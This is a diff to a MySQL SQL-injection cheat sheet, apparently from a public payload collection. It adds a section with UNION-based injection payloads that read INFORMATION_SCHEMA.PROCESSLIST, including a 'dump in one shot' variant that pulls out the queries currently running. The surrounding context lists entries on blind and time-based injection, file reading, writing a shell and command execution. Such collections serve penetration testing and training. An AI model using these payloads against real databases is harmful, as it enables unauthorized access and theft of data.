@@ -19,6 +19,7 @@
     * [MYSQL Blind with LIKE](#mysql-blind-with-like)
 * [MYSQL Time Based](#mysql-time-based)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
+* [MYSQL Current queries](#mysql-current-queries)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
 * [MYSQL UDF command execution](#mysql-udf-command-execution)
@@ -223,6 +224,17 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
 ```
 
+## MYSQL Current queries
+
+This table can list all operations that DB is performing at the moment.
+
+```sql
+union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
+
+-- Dump in one shot example for the table content.
+union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+```
+
 ## MYSQL Read content of a file
 
 Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
@@ -306,3 +318,4 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
 - [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
 - [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
+- [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
